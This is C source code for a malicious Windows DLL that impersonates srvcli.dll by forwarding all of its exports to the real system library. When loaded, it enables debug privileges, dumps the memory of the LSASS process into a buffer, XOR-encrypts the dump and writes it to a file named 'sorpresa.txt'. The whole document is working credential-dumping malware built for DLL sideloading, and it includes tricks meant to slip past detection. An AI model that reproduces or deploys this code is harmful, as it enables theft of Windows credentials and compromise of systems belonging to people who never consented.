#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>
#include <DbgHelp.h>
#pragma comment(lib, "Dbghelp.lib")

#pragma comment(linker,"/export:I_NetDfsGetVersion=C:\\Windows\\System32\\srvcli.I_NetDfsGetVersion,@1")
#pragma comment(linker,"/export:I_NetServerSetServiceBits=C:\\Windows\\System32\\srvcli.I_NetServerSetServiceBits,@2")
#pragma comment(linker,"/export:I_NetServerSetServiceBitsEx=C:\\Windows\\System32\\srvcli.I_NetServerSetServiceBitsEx,@3")
#pragma comment(linker,"/export:LocalAliasGet=C:\\Windows\\System32\\srvcli.LocalAliasGet,@4")
#pragma comment(linker,"/export:LocalFileClose=C:\\Windows\\System32\\srvcli.LocalFileClose,@5")
#pragma comment(linker,"/export:LocalFileEnum=C:\\Windows\\System32\\srvcli.LocalFileEnum,@6")
#pragma comment(linker,"/export:LocalFileEnumEx=C:\\Windows\\System32\\srvcli.LocalFileEnumEx,@7")
#pragma comment(linker,"/export:LocalFileGetInfo=C:\\Windows\\System32\\srvcli.LocalFileGetInfo,@8")
#pragma comment(linker,"/export:LocalFileGetInfoEx=C:\\Windows\\System32\\srvcli.LocalFileGetInfoEx,@9")
#pragma comment(linker,"/export:LocalServerCertificateMappingAdd=C:\\Windows\\System32\\srvcli.LocalServerCertificateMappingAdd,@10")
#pragma comment(linker,"/export:LocalServerCertificateMappingEnum=C:\\Windows\\System32\\srvcli.LocalServerCertificateMappingEnum,@11")
#pragma comment(linker,"/export:LocalServerCertificateMappingGet=C:\\Windows\\System32\\srvcli.LocalServerCertificateMappingGet,@12")
#pragma comment(linker,"/export:LocalServerCertificateMappingRemove=C:\\Windows\\System32\\srvcli.LocalServerCertificateMappingRemove,@13")
#pragma comment(linker,"/export:LocalSessionDel=C:\\Windows\\System32\\srvcli.LocalSessionDel,@14")
#pragma comment(linker,"/export:LocalSessionEnum=C:\\Windows\\System32\\srvcli.LocalSessionEnum,@15")
#pragma comment(linker,"/export:LocalSessionEnumEx=C:\\Windows\\System32\\srvcli.LocalSessionEnumEx,@16")
#pragma comment(linker,"/export:LocalSessionGetInfo=C:\\Windows\\System32\\srvcli.LocalSessionGetInfo,@17")
#pragma comment(linker,"/export:LocalSessionGetInfoEx=C:\\Windows\\System32\\srvcli.LocalSessionGetInfoEx,@18")
#pragma comment(linker,"/export:LocalShareAdd=C:\\Windows\\System32\\srvcli.LocalShareAdd,@19")
#pragma comment(linker,"/export:LocalShareDelEx=C:\\Windows\\System32\\srvcli.LocalShareDelEx,@20")
#pragma comment(linker,"/export:LocalShareEnum=C:\\Windows\\System32\\srvcli.LocalShareEnum,@21")
#pragma comment(linker,"/export:LocalShareEnumEx=C:\\Windows\\System32\\srvcli.LocalShareEnumEx,@22")
#pragma comment(linker,"/export:LocalShareGetInfo=C:\\Windows\\System32\\srvcli.LocalShareGetInfo,@23")
#pragma comment(linker,"/export:LocalShareGetInfoEx=C:\\Windows\\System32\\srvcli.LocalShareGetInfoEx,@24")
#pragma comment(linker,"/export:LocalShareSetInfo=C:\\Windows\\System32\\srvcli.LocalShareSetInfo,@25")
#pragma comment(linker,"/export:NetConnectionEnum=C:\\Windows\\System32\\srvcli.NetConnectionEnum,@26")
#pragma comment(linker,"/export:NetFileClose=C:\\Windows\\System32\\srvcli.NetFileClose,@27")
#pragma comment(linker,"/export:NetFileEnum=C:\\Windows\\System32\\srvcli.NetFileEnum,@28")
#pragma comment(linker,"/export:NetFileGetInfo=C:\\Windows\\System32\\srvcli.NetFileGetInfo,@29")
#pragma comment(linker,"/export:NetpsNameCanonicalize=C:\\Windows\\System32\\srvcli.NetpsNameCanonicalize,@56")
#pragma comment(linker,"/export:NetpsNameCompare=C:\\Windows\\System32\\srvcli.NetpsNameCompare,@57")
#pragma comment(linker,"/export:NetpsNameValidate=C:\\Windows\\System32\\srvcli.NetpsNameValidate,@58")
#pragma comment(linker,"/export:NetpsPathCanonicalize=C:\\Windows\\System32\\srvcli.NetpsPathCanonicalize,@59")
#pragma comment(linker,"/export:NetpsPathCompare=C:\\Windows\\System32\\srvcli.NetpsPathCompare,@60")
#pragma comment(linker,"/export:NetpsPathType=C:\\Windows\\System32\\srvcli.NetpsPathType,@61")
#pragma comment(linker,"/export:NetRemoteTOD=C:\\Windows\\System32\\srvcli.NetRemoteTOD,@30")
#pragma comment(linker,"/export:NetServerAliasAdd=C:\\Windows\\System32\\srvcli.NetServerAliasAdd,@31")
#pragma comment(linker,"/export:NetServerAliasDel=C:\\Windows\\System32\\srvcli.NetServerAliasDel,@32")
#pragma comment(linker,"/export:NetServerAliasEnum=C:\\Windows\\System32\\srvcli.NetServerAliasEnum,@33")
#pragma comment(linker,"/export:NetServerComputerNameAdd=C:\\Windows\\System32\\srvcli.NetServerComputerNameAdd,@34")
#pragma comment(linker,"/export:NetServerComputerNameDel=C:\\Windows\\System32\\srvcli.NetServerComputerNameDel,@35")
#pragma comment(linker,"/export:NetServerDiskEnum=C:\\Windows\\System32\\srvcli.NetServerDiskEnum,@36")
#pragma comment(linker,"/export:NetServerGetInfo=C:\\Windows\\System32\\srvcli.NetServerGetInfo,@37")
#pragma comment(linker,"/export:NetServerSetInfo=C:\\Windows\\System32\\srvcli.NetServerSetInfo,@38")
#pragma comment(linker,"/export:NetServerStatisticsGet=C:\\Windows\\System32\\srvcli.NetServerStatisticsGet,@39")
#pragma comment(linker,"/export:NetServerTransportAdd=C:\\Windows\\System32\\srvcli.NetServerTransportAdd,@40")
#pragma comment(linker,"/export:NetServerTransportAddEx=C:\\Windows\\System32\\srvcli.NetServerTransportAddEx,@41")
#pragma comment(linker,"/export:NetServerTransportDel=C:\\Windows\\System32\\srvcli.NetServerTransportDel,@42")
#pragma comment(linker,"/export:NetServerTransportEnum=C:\\Windows\\System32\\srvcli.NetServerTransportEnum,@43")
#pragma comment(linker,"/export:NetSessionDel=C:\\Windows\\System32\\srvcli.NetSessionDel,@44")
#pragma comment(linker,"/export:NetSessionEnum=C:\\Windows\\System32\\srvcli.NetSessionEnum,@45")
#pragma comment(linker,"/export:NetSessionGetInfo=C:\\Windows\\System32\\srvcli.NetSessionGetInfo,@46")
#pragma comment(linker,"/export:NetShareAdd=C:\\Windows\\System32\\srvcli.NetShareAdd,@47")
#pragma comment(linker,"/export:NetShareCheck=C:\\Windows\\System32\\srvcli.NetShareCheck,@48")
#pragma comment(linker,"/export:NetShareDel=C:\\Windows\\System32\\srvcli.NetShareDel,@49")
#pragma comment(linker,"/export:NetShareDelEx=C:\\Windows\\System32\\srvcli.NetShareDelEx,@50")
#pragma comment(linker,"/export:NetShareDelSticky=C:\\Windows\\System32\\srvcli.NetShareDelSticky,@51")
#pragma comment(linker,"/export:NetShareEnum=C:\\Windows\\System32\\srvcli.NetShareEnum,@52")
#pragma comment(linker,"/export:NetShareEnumSticky=C:\\Windows\\System32\\srvcli.NetShareEnumSticky,@53")
#pragma comment(linker,"/export:NetShareGetInfo=C:\\Windows\\System32\\srvcli.NetShareGetInfo,@54")
#pragma comment(linker,"/export:NetShareSetInfo=C:\\Windows\\System32\\srvcli.NetShareSetInfo,@55")

// Global variables the will hold the dump data and its size
LPVOID dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 200); // Allocate 200MB buffer on the heap
DWORD dumpSize = 0;

// Callback routine that we be called by the MiniDumpWriteDump function
BOOL CALLBACK DumpCallbackRoutine(PVOID CallbackParam, const PMINIDUMP_CALLBACK_INPUT CallbackInput, PMINIDUMP_CALLBACK_OUTPUT CallbackOutput) {
	LPVOID destination = 0;
	LPVOID source = 0;
	DWORD bufferSize = 0;
	switch (CallbackInput->CallbackType) {
	case IoStartCallback:
		CallbackOutput->Status = S_FALSE;
		printf("[+] Starting dump to memory buffer\n");
		break;
	case IoWriteAllCallback:
		// Buffer holding the current chunk of dump data
		source = CallbackInput->Io.Buffer;

		// Calculate the memory address we need to copy the chunk of dump data to based on the current dump data offset
		destination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)CallbackInput->Io.Offset);

		// Size of the current chunk of dump data
		bufferSize = CallbackInput->Io.BufferBytes;

		// Copy the chunk data to the appropriate memory address of our allocated buffer
		RtlCopyMemory(destination, source, bufferSize);
		dumpSize += bufferSize; // Incremeant the total size of the dump with the current chunk size

		//printf("[+] Copied %i bytes to memory buffer\n", bufferSize);

		CallbackOutput->Status = S_OK;
		break;
	case IoFinishCallback:
		CallbackOutput->Status = S_OK;
		printf("[+] Copied %i bytes to memory buffer\n", dumpSize);
		break;
	}
	return TRUE;
}

// Simple xor routine on memory buffer
void XOR(char* data, int data_len, char* key, int key_len)
{
	int j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1)
			j = 0;
		data[i] = data[i] ^ key[j];
		j++;
	}
}

// Enable SeDebugPrivilige if not enabled already
BOOL SetDebugPrivilege() {
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES TokenPrivileges = { 0 };

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		printf("[-] Could not get current process token with TOKEN_ADJUST_PRIVILEGES\n");
		return FALSE;
	}

	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : 0;

	char sPriv[] = { 'S','e','D','e','b','u','g','P','r','i','v','i','l','e','g','e',0 };
	if (!LookupPrivilegeValueA(NULL, (LPCSTR)sPriv, &TokenPrivileges.Privileges[0].Luid)) {
		CloseHandle(hToken);
		printf("[-] No SeDebugPrivs. Make sure you are an admin\n");
		return FALSE;
	}

	if (!AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
		CloseHandle(hToken);
		printf("[-] Could not adjust to SeDebugPrivs\n");
		return FALSE;
	}

	CloseHandle(hToken);
	return TRUE;
}

// Find PID of a process by name
int FindPID(const char* procname)
{
	int pid = 0;
	PROCESSENTRY32 proc = {};
	proc.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	bool bProc = Process32First(snapshot, &proc);

	while (bProc)
	{
		if (strcmp(procname, proc.szExeFile) == 0)
		{
			pid = proc.th32ProcessID;
			break;
		}
		bProc = Process32Next(snapshot, &proc);
	}
	return pid;
}

int main(int argc, char** argv)
{
	// Find LSASS PID
	printf("[+] Searching for LSASS PID\n");
	int pid = FindPID("lsass.exe");
	if (pid == 0) {
		printf("[-] Could not find LSASS PID\n");
		return 0;
	}
	printf("[+] LSASS PID: %i\n", pid);

	// Make sure we have SeDebugPrivilege enabled
	if (!SetDebugPrivilege())
		return 0;

	// Open handle to LSASS
	HANDLE hProc = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, pid);
	if (hProc == NULL) {
		printf("[-] Could not open handle to LSASS process\n");
		return 0;
	}

	// Create a "MINIDUMP_CALLBACK_INFORMATION" structure that points to our DumpCallbackRoutine as a CallbackRoutine
	MINIDUMP_CALLBACK_INFORMATION CallbackInfo = { 0 };
	CallbackInfo.CallbackRoutine = DumpCallbackRoutine;

	// Do full memory dump of lsass and use our CallbackRoutine to handle the dump data instead of writing it directly to disk
	typedef BOOL (WINAPI *MyMiniDumpWriteDump)(HANDLE, DWORD, HANDLE, MINIDUMP_TYPE, PMINIDUMP_EXCEPTION_INFORMATION, PMINIDUMP_USER_STREAM_INFORMATION, PMINIDUMP_CALLBACK_INFORMATION);
	MyMiniDumpWriteDump myMiniDumpWriteDump = (MyMiniDumpWriteDump)GetProcAddress(LoadLibrary("dbghelp.dll"), "MiniDumpWriteDump");
	BOOL success = myMiniDumpWriteDump(hProc, pid, NULL, MiniDumpWithFullMemory, NULL, NULL, &CallbackInfo);
	if (success) {
		printf("[+] Successfully dumped LSASS to memory!\n");
		MessageBox(NULL, "OK", "OK", MB_OK);
	}
	else {
		printf("[-] Could not dump LSASS to memory\n[-] Error Code: %i\n", GetLastError());
		return 0;
	}

	// Xor encrypt our dump data in memory using the specified key
	char key[] = "abc1234";
	printf("[+] Xor encrypting the memory buffer containing the dump data\n[+] Xor key: %s\n", key);
	XOR((char*)dumpBuffer, dumpSize, key, sizeof(key));

	// Create file to hold the encrypted dump data
	HANDLE hFile = CreateFile("sorpresa.txt", GENERIC_ALL, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	// Write the encrypted dump data to our file
	DWORD bytesWritten = 0;
	WriteFile(hFile, dumpBuffer, dumpSize, &bytesWritten, NULL);
	printf("[+] Enrypted dump data written to \"sorpresa.txt\" file\n");
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
	if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
		MessageBox(NULL, "Running", "Running", MB_OK);
		main(0, {});
	}
	return TRUE;
}
